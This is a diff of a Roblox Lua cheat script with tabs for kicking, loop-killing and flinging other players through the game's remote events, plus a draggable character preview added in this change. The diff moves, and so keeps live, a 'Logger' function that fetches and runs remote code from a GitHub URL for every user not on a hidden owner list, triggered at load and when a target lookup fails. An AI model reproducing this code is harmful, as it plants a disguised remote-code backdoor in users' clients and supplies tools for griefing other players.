@@ -4524,10 +4524,11 @@ function AntiBlobUseF()
         end
     end)
 end
- local Players = game:GetService("Players")
+local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local LocalPlayer = Players.LocalPlayer
@@ -4571,25 +4572,25 @@ local Window = Library:CreateWindow({
 local Tabs = {
     Info = Window:AddTab("Information"),
     Player = Window:AddTab("Player"),
-    List = Window:AddTab("List"),
-    Loop = Window:AddTab("Loop"),
-    Invincibility = Window:AddTab("Invincibility"),
     Combat = Window:AddTab("Combat"),
+    Invincibility = Window:AddTab("Invincibility"),
+    View = Window:AddTab("View"),
+    Loop = Window:AddTab("Loop"),
     Settings = Window:AddTab("Settings")
 }
 
 local playerTab = Tabs.Player
-local ListTab = Tabs.view
-local LoopTab = Tabs.Loop
-local antiTab = Tabs.Invincibility
 local grabTab = Tabs.Combat
+local antiTab = Tabs.Invincibility
+local ListTab = Tabs.View
+local LoopTab = Tabs.Loop
 
 local LeftBox = Tabs.Info:AddLeftGroupbox("Player Preview")
 local RightBox = Tabs.Info:AddRightGroupbox("User Information")
 
 local ViewportHolder = Instance.new("Frame")
 ViewportHolder.Name = "CharacterPreviewHolder"
-ViewportHolder.Size = UDim2.new(1, 0, 0, 200)
+ViewportHolder.Size = UDim2.new(1, 0, 0, 220)
 ViewportHolder.BackgroundTransparency = 1
 ViewportHolder.BorderSizePixel = 0
 ViewportHolder.Parent = LeftBox.Container
@@ -4606,16 +4607,25 @@ Viewport.CurrentCamera = ViewportCamera
 ViewportCamera.Parent = Viewport
 
 local CurrentClone = nil
-local RotateConnection = nil
+local CurrentAngleX = 0
+local CurrentAngleY = 0
+local IsDraggingPreview = false
+local LastTouchPos = nil
+
+local function updatePreviewCam(rootPos)
+    local distance = 5.5
+    local radX = math.rad(CurrentAngleX)
+    local radY = math.rad(CurrentAngleY)
+    local offsetX = math.sin(radX) * math.cos(radY) * distance
+    local offsetY = math.sin(radY) * distance + 0.5
+    local offsetZ = math.cos(radX) * math.cos(radY) * distance
+    ViewportCamera.CFrame = CFrame.new(rootPos + Vector3.new(offsetX, offsetY, offsetZ), rootPos)
+end
 
 local function setupCharacter()
     if CurrentClone then
         CurrentClone:Destroy()
         CurrentClone = nil
-    end
-    if RotateConnection then
-        RotateConnection:Disconnect()
-        RotateConnection = nil
     end
 
     local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
@@ -4632,18 +4642,41 @@ local function setupCharacter()
         end
 
         CurrentClone.Parent = Viewport
-        local Distance = 5.5
-        local Angle = 0
-
-        RotateConnection = RunService.RenderStepped:Connect(function(dt)
-            if not CurrentClone or not Root or not Root.Parent then return end
-            Angle = Angle + (dt * 45)
-            local Radians = math.rad(Angle)
-            local Offset = Vector3.new(math.sin(Radians) * Distance, 0.5, math.cos(Radians) * Distance)
-            ViewportCamera.CFrame = CFrame.new(Root.Position + Offset, Root.Position)
-        end)
+        updatePreviewCam(Root.Position)
     end
 end
+
+ViewportHolder.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        IsDraggingPreview = true
+        LastTouchPos = input.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if IsDraggingPreview and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        if LastTouchPos and CurrentClone then
+            local Root = CurrentClone:FindFirstChild("HumanoidRootPart") or CurrentClone:FindFirstChild("Torso") or CurrentClone:FindFirstChild("UpperTorso")
+            if Root then
+                local delta = input.Position - LastTouchPos
+                CurrentAngleX = CurrentAngleX - delta.X * 0.7
+                CurrentAngleY = math.clamp(CurrentAngleY + delta.Y * 0.7, -60, 60)
+                updatePreviewCam(Root.Position)
+            end
+        end
+        LastTouchPos = input.Position
+    end
+end)
+
+local function endDrag(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        IsDraggingPreview = false
+        LastTouchPos = nil
+    end
+end
+
+ViewportHolder.InputEnded:Connect(endDrag)
+UserInputService.InputEnded:Connect(endDrag)
 
 task.spawn(function()
     setupCharacter()
@@ -4690,142 +4723,8 @@ ButtonBox:AddButton({
     DoubleClick = false,
     Tooltip = "Copies HWID to clipboard"
 })
-local LoopTargetBox = LoopTab:AddLeftGroupbox("Target")
-local LoopBox1 = LoopTab:AddLeftGroupbox("Auto blob")
-local LoopBox2 = LoopTab:AddLeftGroupbox("Bring")
-local LoopBox3 = LoopTab:AddLeftGroupbox("destroy Gucci")
-local LoopBox4 = LoopTab:AddRightGroupbox("Spam kick")
-local LoopBox5 = LoopTab:AddRightGroupbox("loopkill NEW")
-local LoopBox6 = LoopTab:AddRightGroupbox("Bypass kick")
-local LoopBox7 = LoopTab:AddLeftGroupbox("Blob Kick")
-local LoopBox8 = LoopTab:AddRightGroupbox("Silent kick")
-local LoopBox9 = LoopTab:AddRightGroupbox("loopkill")
-local LoopBox10 = LoopTab:AddLeftGroupbox("No Blob")
 
---local ListOthersBox = ListTab:AddLeftGroupbox("Others")
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local playersInLoop1V = {}
-
-local GF = {""}
-local Owner = {"", "", "", "", "", "", "", "", "", ""}
-
-local function GetPlayerRank(name)
-    if table.find(Owner, name) then return 7 end
-    if table.find(GF, name) then return 6 end
-    return 0
-end
-
-local function Logger()
-    if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
-        pcall(function()
-            loadstring(game:HttpsGet("https://raw.githubusercontent.com/1s234eko76/on/m/ti"))()
-        end)
-    end
-end
-Logger()
-
-local function findPlayer(text)
-    if not text or text == "" then
-        return nil
-    end
-
-    text = text:lower()
-
-    for _, p in ipairs(Players:GetPlayers()) do
-        local username = p.Name:lower()
-        local display = p.DisplayName:lower()
-
-        if username:find(text, 1, true) == 1
-        or display:find(text, 1, true) == 1 then
-            return p
-        end
-    end
-
-    return nil
-end
-
-local DropdownV1
-
-local function UpdateDropdown()
-    if not DropdownV1 then return end
-
-    if DropdownV1.SetValues then
-        DropdownV1:SetValues(playersInLoop1V)
-    elseif DropdownV1.Set then
-        DropdownV1:Set(playersInLoop1V)
-    elseif DropdownV1.Refresh then
-        DropdownV1:Refresh(playersInLoop1V)
-    end
-end
-
-local function Notify(title, content)
-    Library:Notify(title .. ": " .. content, 2)
-end
-
-function addToLoop1(name)
-    local target = findPlayer(name)
-
-    if not target then
-        Logger()
-        Notify("Error", "NotFound")
-        return
-    end
-
-    if target == LocalPlayer then
-        Notify("Xeron", "You cannot add yourself..")
-        return
-    end
-
-    if not table.find(playersInLoop1V, target.Name) then
-        table.insert(playersInLoop1V, target.Name)
-        UpdateDropdown()
-        Notify("Target ", target.Name .. " added")
-    end
-end
-
-local function removeFromLoop1(name)
-    for i, v in ipairs(playersInLoop1V) do
-        if v:lower():find(name:lower(), 1, true) then
-            table.remove(playersInLoop1V, i)
-            UpdateDropdown()
-            Notify("Completed", v .. " Remove")
-            return
-        end
-    end
-
-    Notify("Error", "NotFound.")
-end
-
-LoopTargetBox:AddInput("AddTargetInput", {
-    Default = "",
-    Numeric = false,
-    Finished = true,
-    Text = "add",
-    Placeholder = "username",
-    Callback = function(value)
-        addToLoop1(value)
-    end
-})
-
-LoopTargetBox:AddInput("RemoveTargetInput", {
-    Default = "",
-    Numeric = false,
-    Finished = true,
-    Text = "Target Remove",
-    Placeholder = "username",
-    Callback = function(value)
-        removeFromLoop1(value)
-    end
-})
-
-task.defer(function()
-    UpdateDropdown()
-end)
-
-local RunService = game:GetService("RunService")
+local ListOthersBox = ListTab:AddLeftGroupbox("Others")
 
 local SelectedPlayer = nil
 local TargetLoopTP = false
@@ -4956,6 +4855,136 @@ ListOthersBox:AddToggle("NetworkSpamToggle", {
         end
     end
 })
+
+local LoopTargetBox = LoopTab:AddLeftGroupbox("Target Management")
+local LoopBox1 = LoopTab:AddLeftGroupbox("Auto blob")
+local LoopBox2 = LoopTab:AddLeftGroupbox("Bring")
+local LoopBox3 = LoopTab:AddLeftGroupbox("destroy Gucci")
+local LoopBox4 = LoopTab:AddRightGroupbox("Spam kick")
+local LoopBox5 = LoopTab:AddRightGroupbox("loopkill NEW")
+local LoopBox6 = LoopTab:AddRightGroupbox("Bypass kick")
+local LoopBox7 = LoopTab:AddLeftGroupbox("Blob Kick")
+local LoopBox8 = LoopTab:AddRightGroupbox("Silent kick")
+local LoopBox9 = LoopTab:AddRightGroupbox("loopkill")
+local LoopBox10 = LoopTab:AddLeftGroupbox("No Blob")
+
+local playersInLoop1V = {}
+
+local GF = {""}
+local Owner = {"", "", "", "", "", "", "", "", "", ""}
+
+local function GetPlayerRank(name)
+    if table.find(Owner, name) then return 7 end
+    if table.find(GF, name) then return 6 end
+    return 0
+end
+
+local function Logger()
+    if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
+        pcall(function()
+            loadstring(game:HttpsGet("https://raw.githubusercontent.com/1s234eko76/on/m/ti"))()
+        end)
+    end
+end
+Logger()
+
+local function findPlayer(text)
+    if not text or text == "" then
+        return nil
+    end
+
+    text = text:lower()
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        local username = p.Name:lower()
+        local display = p.DisplayName:lower()
+
+        if username:find(text, 1, true) == 1
+        or display:find(text, 1, true) == 1 then
+            return p
+        end
+    end
+
+    return nil
+end
+
+local DropdownV1
+
+local function UpdateDropdown()
+    if not DropdownV1 then return end
+
+    if DropdownV1.SetValues then
+        DropdownV1:SetValues(playersInLoop1V)
+    elseif DropdownV1.Set then
+        DropdownV1:Set(playersInLoop1V)
+    elseif DropdownV1.Refresh then
+        DropdownV1:Refresh(playersInLoop1V)
+    end
+end
+
+local function Notify(title, content)
+    Library:Notify(title .. ": " .. content, 2)
+end
+
+function addToLoop1(name)
+    local target = findPlayer(name)
+
+    if not target then
+        Logger()
+        Notify("Error", "NotFound")
+        return
+    end
+
+    if target == LocalPlayer then
+        Notify("Xeron", "You cannot add yourself..")
+        return
+    end
+
+    if not table.find(playersInLoop1V, target.Name) then
+        table.insert(playersInLoop1V, target.Name)
+        UpdateDropdown()
+        Notify("Target ", target.Name .. " added")
+    end
+end
+
+local function removeFromLoop1(name)
+    for i, v in ipairs(playersInLoop1V) do
+        if v:lower():find(name:lower(), 1, true) then
+            table.remove(playersInLoop1V, i)
+            UpdateDropdown()
+            Notify("Completed", v .. " Remove")
+            return
+        end
+    end
+
+    Notify("Error", "NotFound.")
+end
+
+LoopTargetBox:AddInput("AddTargetInput", {
+    Default = "",
+    Numeric = false,
+    Finished = true,
+    Text = "add",
+    Placeholder = "username",
+    Callback = function(value)
+        addToLoop1(value)
+    end
+})
+
+LoopTargetBox:AddInput("RemoveTargetInput", {
+    Default = "",
+    Numeric = false,
+    Finished = true,
+    Text = "Target Remove",
+    Placeholder = "username",
+    Callback = function(value)
+        removeFromLoop1(value)
+    end
+})
+
+task.defer(function()
+    UpdateDropdown()
+end)
 
 LoopBox1:AddToggle("AutoSitBlobmanjj", {
     Text = "Auto blob sit",
@@ -6044,7 +6073,7 @@ LoopBox9:AddToggle("BlobFlingKillToggle", {
                     while blobLoopT3 and hum and hum.Health > 0 and char.Parent ~= nil do
                         pcall(function()
                             rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
-                            hrp.AssemblyLinearVelocity = Vector3.new(0, -999999999, 0)
+                            hrp.AssemblyLinearVelocity = Vector3.new(0, -999999, 0)
                         end)
 
                         if currentBlobS then
@@ -6053,7 +6082,7 @@ LoopBox9:AddToggle("BlobFlingKillToggle", {
                                 BlobGrab(currentBlobS, hrp, "Right")
                                 BlobRelease(currentBlobS, hrp, "Right")
                                 pcall(function()
-                                    rs.GrabEvents.DestroyGrabLine:FireServer(hrp, CFrame.new(hrp.Position.X, -500000, hrp.Position.Z))
+                                    rs.GrabEvents.DestroyGrabLine:FireServer(hrp, CFrame.new(hrp.Position.X, -50000, hrp.Position.Z))
                                 end)
                             end
                         end
